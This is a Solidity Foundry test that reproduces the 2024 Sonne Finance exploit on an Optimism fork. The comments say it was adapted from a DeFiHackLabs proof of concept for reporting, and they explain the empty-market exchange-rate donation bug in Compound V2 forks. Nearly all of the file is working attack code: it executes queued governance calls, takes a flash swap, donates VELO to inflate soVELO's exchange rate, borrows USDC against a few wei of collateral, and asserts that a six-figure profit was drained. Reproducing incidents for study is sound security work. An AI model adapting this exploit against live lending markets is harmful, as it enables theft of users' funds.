// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Test.sol";

// Reproduction of the Sonne Finance exploit (2024-05-14, Optimism, ~$20M).
// Exploit logic adapted from the DeFiHackLabs PoC; wrapped with report-friendly
// logging. Runs against the REAL Sonne (Compound V2 fork) contracts on an
// Optimism mainnet fork at block 120,062,492 (one before the first attack tx).
//
// Root cause: a freshly-created cToken market (soVELO) has totalSupply ~ 0.
// exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply, so
// DONATING underlying (a direct transfer, no mint) with a tiny totalSupply makes
// the exchange rate explode. A few wei of soVELO then counts as enormous
// collateral, and rounding lets the attacker borrow real assets and redeem the
// donation back. Known Compound V2 fork bug (Hundred Finance, Apr 2023).

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ICToken {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface ITimelock {
    function execute(address target, uint256 value, bytes memory data, bytes32 predecessor, bytes32 salt)
        external
        payable;
}

interface IVolatilePool {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

contract SonneDonationTest is Test {
    address constant soVELO = 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5;
    address constant soUSDC = 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F;
    address constant Unitroller = 0x60CF091cD3f50420d50fD7f707414d0DF4751C58;
    address constant VELO = 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db;
    address constant USDC = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address constant POOL = 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5; // Velodrome VolatileV2 USDC/VELO
    ITimelock constant TL = ITimelock(0x37fF10390F22fABDc2137E428A6E6965960D60b6);

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("optimism"), 120_062_493 - 1);
    }

    function test_ReproduceSonneDonation() public {
        console.log("==================================================================");
        console.log(" Sonne Finance exploit - Optimism fork (block 120,062,492)");
        console.log(" REAL Sonne (Compound V2 fork) soVELO / soUSDC markets");
        console.log("==================================================================");
        console.log("soVELO totalSupply BEFORE = %s (empty market)", ICToken(soVELO).totalSupply());

        // 1. Execute the already-queued governance proposals that create/configure
        //    the new soVELO market (this is what left an empty, manipulable market).
        _executeQueuedProposals();
        console.log("[1] queued proposals executed -> soVELO market live but EMPTY");

        // 2. Flash loan 35,469,150 VELO from Velodrome; work happens in hook().
        IERC20(VELO).approve(soVELO, type(uint256).max);
        IVolatilePool(POOL).swap(0, 35_469_150_965_253_049_864_450_449, address(this), hex"01");

        uint256 profit = IERC20(USDC).balanceOf(address(this));
        console.log("");
        console.log("==================================================================");
        console.log("  USDC profit from this single tx = $%s", profit / 1e6);
        console.log("  (one of two attack txs; ~$20M total across both)");
        console.log("==================================================================");
        assertGt(profit, 100_000e6, "expected six-figure+ USDC drained");
    }

    // Velodrome flash-swap callback
    function hook(address, uint256, uint256 amount1, bytes calldata) external {
        // 4. Mint a tiny amount of soVELO (near-empty supply).
        ICToken(soVELO).mint(400_000_001);
        console.log("");
        console.log("[2] minted tiny soVELO; supply now = %s wei", ICToken(soVELO).totalSupply());
        console.log("    exchangeRate BEFORE donation = %s", ICToken(soVELO).exchangeRateStored());

        // 5. DONATE all flash-loaned VELO straight to soVELO (no mint) -> inflates rate.
        uint256 veloBal = IERC20(VELO).balanceOf(address(this));
        IERC20(VELO).transfer(soVELO, veloBal);
        console.log("    donated %s VELO directly to soVELO", veloBal / 1e18);
        console.log("    exchangeRate AFTER donation  = %s  (exploded)", ICToken(soVELO).exchangeRateStored());

        // 6. Enter markets and borrow real USDC against the inflated collateral.
        address[] memory cTokens = new address[](2);
        cTokens[0] = soUSDC;
        cTokens[1] = soVELO;
        IUnitroller(Unitroller).enterMarkets(cTokens);
        ICToken(soUSDC).borrow(768_947_220_961);
        console.log("");
        console.log("[3] borrowed %s USDC against ~2 wei of soVELO collateral", IERC20(USDC).balanceOf(address(this)) / 1e6);

        // 7. Redeem the donated VELO back (rounding lets almost all of it out).
        uint256 donated = IERC20(VELO).balanceOf(soVELO);
        ICToken(soVELO).redeemUnderlying(donated - 1);

        // 9-10. Repay the flash loan (+ fee in USDC).
        IERC20(VELO).transfer(POOL, amount1 - 1);
        IERC20(USDC).transfer(POOL, 44_656_863_632);
        console.log("[4] redeemed donation, repaid flash loan (+fee) -> USDC kept as profit");
    }

    function _executeQueuedProposals() internal {
        bytes memory d1 = hex"fca7820b0000000000000000000000000000000000000000000000000429d069189e0000";
        bytes memory d2 = hex"f2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e";
        bytes memory d3 = hex"55ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea";
        bytes memory d4 = hex"a76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5";
        bytes memory d5 =
            hex"e4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db732547630000";
        TL.execute(soVELO, 0, d1, bytes32(0), 0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c);
        TL.execute(soVELO, 0, d2, bytes32(0), 0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42);
        TL.execute(Unitroller, 0, d3, bytes32(0), 0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd);
        TL.execute(Unitroller, 0, d4, bytes32(0), 0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b);
        TL.execute(Unitroller, 0, d5, bytes32(0), 0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed);
    }
}
